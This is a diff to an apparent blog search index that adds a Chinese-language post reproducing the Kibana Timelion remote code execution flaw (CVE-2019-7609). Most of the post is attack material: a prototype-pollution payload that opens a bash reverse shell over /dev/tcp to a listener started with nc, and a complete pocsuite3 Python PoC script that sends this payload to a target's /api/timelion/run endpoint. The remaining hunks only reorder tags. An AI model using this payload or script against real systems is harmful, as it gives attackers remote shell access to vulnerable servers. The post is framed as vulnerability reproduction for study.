@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>kibana远程代码执行漏洞复现</title>
+      <link href="/2019/10/20/kibana-rce-lou-dong-fu-xian/"/>
+      <url>/2019/10/20/kibana-rce-lou-dong-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>Elasticsearch Kibana是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具。<br>Kibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞。<br>远程攻击者可通过发送请求利用该漏洞执行JavaScript代码并能以Kibana进程权限执行任意命令。</p><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><pre><code>ElasticSearch Kibana &lt;5.6.15ElasticSearch Kibana &lt;6.6.1</code></pre><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192025.png" alt></p><p>该漏洞触发，需要<code>Timelion</code> 和 <code>Canvas</code>插件</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022191915.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在服务器监听<br>payload里面设置的什么端口，就监听什么端口。</p><p><code>nc -lvvp 12345</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022204934.png" alt></p><p>点在Timelion处,直接填入payload，点击run<br><strong>（如果有设置用户认证，则需要先登陆）</strong><br>过程和结果如图</p><p><strong>payload：</strong></p><pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022210726.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192538.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022205351.png" alt></p><p><strong>POC</strong></p><pre><code>#! python3&quot;&quot;&quot;@FileName: elasticsearch_kibana_rce.py@Author: dylan@software: PyCharm @Datetime: 2019-10-20 15:23:54&quot;&quot;&quot;import refrom collections import OrderedDictimport jsonimport urllib.parsefrom bs4 import BeautifulSoupfrom pocsuite3.api import Output, POCBase, register_poc, requests, OptStringclass DemoPOC(POCBase):    vulID = &quot;CVE-2019-7609&quot;  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0    version = &quot;3.0&quot;  # 默认为1    author = &quot;dylan&quot;  # PoC作者的大名    vulDate = &quot;2019/10/20&quot;  # 漏洞公开的时间,不知道就写今天    createDate = &quot;2019/10/20&quot;  # 编写 PoC 的日期    updateDate = &quot;2019/10/20&quot;  # PoC 更新的时间,默认和编写时间一样    references = [&quot;https://github.com/jas502n/kibana-RCE&quot;]  # 漏洞地址来源,0day不用写    name = &quot;elasticsearch_kibana_rce&quot;  # PoC 名称    appPowerLink = &quot;&quot;  # 漏洞厂商主页地址    appName = &quot;elasticsearch_kibana&quot;  # 漏洞应用名称    appVersion = &quot;Kibana &lt; 6.6.1,Kibana &lt; 5.6.15&quot;  # 漏洞影响版本    vulType = &quot;rce&quot;  # 漏洞类型,类型参考见 漏洞类型规范表    desc = &quot;&quot;&quot;        Need Timelion And Canvas    &quot;&quot;&quot;  # 漏洞简要描述    samples = []  # 测试样列,就是用 PoC 测试成功的网站    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    pocDesc = &quot;&quot;&quot;    pocsuite -r &quot;elasticsearch_kibana_rce.py&quot; -u 目标ip --ncip &quot;监听ip&quot; --ncport &quot;监听端口&quot;    pocsuite -r &quot;elasticsearch_kibana_rce.py&quot; -u https://192.168.1.1 --ncip &quot;192.168.1.1&quot; --ncport &quot;12345&quot;    &quot;&quot;&quot;    def _options(self):        o = OrderedDict()        o[&quot;ncip&quot;] = OptString(&#39;&#39;, description=&#39;请输入监听服务器IP&#39;, require=True)        o[&quot;ncport&quot;] = OptString(&#39;&#39;, description=&#39;请输入监听服务器端口&#39;, require=True)        return o    def _verify(self):        # 验证代码        result = {}        output = Output(self)        path1 = self.url + &quot;/app/timelion&quot;        path2 = self.url + &quot;/api/timelion/run&quot;        payload = {            &quot;sheet&quot;: [                &quot;.es(*).props(label.__proto__.env.AAAA=&#39;require(\&quot;child_process\&quot;).exec(\&quot;bash -i &gt;&amp; &quot;                &quot;/dev/tcp/&quot; + self.get_option(&quot;ncip&quot;) + &quot;/&quot; + self.get_option(                    &quot;ncport&quot;) + &quot; 0&gt;&amp;1\&quot;);process.exit()//&#39;)\n.props(&quot;                                &quot;label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)&quot;],            &quot;time&quot;: {&quot;from&quot;: &quot;now-15m&quot;, &quot;to&quot;: &quot;now&quot;, &quot;mode&quot;: &quot;quick&quot;, &quot;interval&quot;: &quot;auto&quot;,                     &quot;timezone&quot;: &quot;Asia/Shanghai&quot;}        }        html = requests.get(path1, verify=False, timeout=120).text        # print(html)        soup = BeautifulSoup(html, &#39;lxml&#39;)        kbn_version = re.compile(&#39;\d\.\d\.\d&#39;).search(str(soup.find(&quot;kbn-injected-metadata&quot;))).group(0)        # print(kbn_version)        header = {            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;,            &#39;Accept&#39;: &#39;application/json, text/plain, */*&#39;,            &quot;Accept-Language&quot;: &quot;zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&quot;,            &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,            &#39;Connection&#39;: &#39;close&#39;,            &#39;kbn-version&#39;: kbn_version,            &#39;Content-Type&#39;: &#39;application/json;charset=UTF-8&#39;        }        respose2 = requests.post(path2, headers=header, data=json.dumps(payload), verify=False, timeout=30)        # print(respose2.status_code)        if respose2.status_code == 200:  # result是返回结果            result[&#39;VerifyInfo&#39;] = {}            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url            result[&#39;VerifyInfo&#39;][&#39;Referer&#39;] = &quot;&quot;        return self.parse_output(result)    def _attack(self):        # 攻击代码        return self._verify()    def parse_output(self, result):        output = Output(self)        if result:            output.success(result)        else:            output.fail(&quot;target is not vulnerable&quot;)        return output# 注册 DemoPOC 类register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/jas502n/kibana-RCE" target="_blank" rel="noopener">kibana-RCE: kibana &lt; 6.6.0 未授权远程代码命令执行 (Need Timelion And Canvas),CVE-2019-7609</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 复现 </tag>
+            
+            <tag> kibana </tag>
+            
+            <tag> Elasticsearch </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>linux sudo 提权漏洞(CVE-2019-14287)复现</title>
       <link href="/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/"/>
       <url>/2019/10/15/linux-sudo-root-quan-xian-rao-guo-lou-dong-cve-2019-14287-fu-xian/</url>
@@ -80,9 +111,9 @@
       
         <tags>
             
-            <tag> tools </tag>
-            
             <tag> web安全 </tag>
+            
+            <tag> tools </tag>
             
             <tag> wifi </tag>
             
@@ -115,11 +146,11 @@
             
             <tag> 复现 </tag>
             
+            <tag> RCE </tag>
+            
             <tag> phpstudy </tag>
             
             <tag> 后门 </tag>
-            
-            <tag> RCE </tag>
             
         </tags>
       
@@ -144,13 +175,13 @@
       
         <tags>
             
+            <tag> tools </tag>
+            
             <tag> Ubuntu16 </tag>
             
             <tag> 源码 </tag>
             
             <tag> IVRE </tag>
-            
-            <tag> tools </tag>
             
             <tag> 网络侦查框架 </tag>
             
@@ -268,9 +299,9 @@
       
         <tags>
             
-            <tag> tools </tag>
-            
             <tag> web安全 </tag>
+            
+            <tag> tools </tag>
             
             <tag> sources </tag>
             
@@ -296,8 +327,6 @@
       
       
         <tags>
-            
-            <tag> 漏洞 </tag>
             
             <tag> 复现 </tag>
             
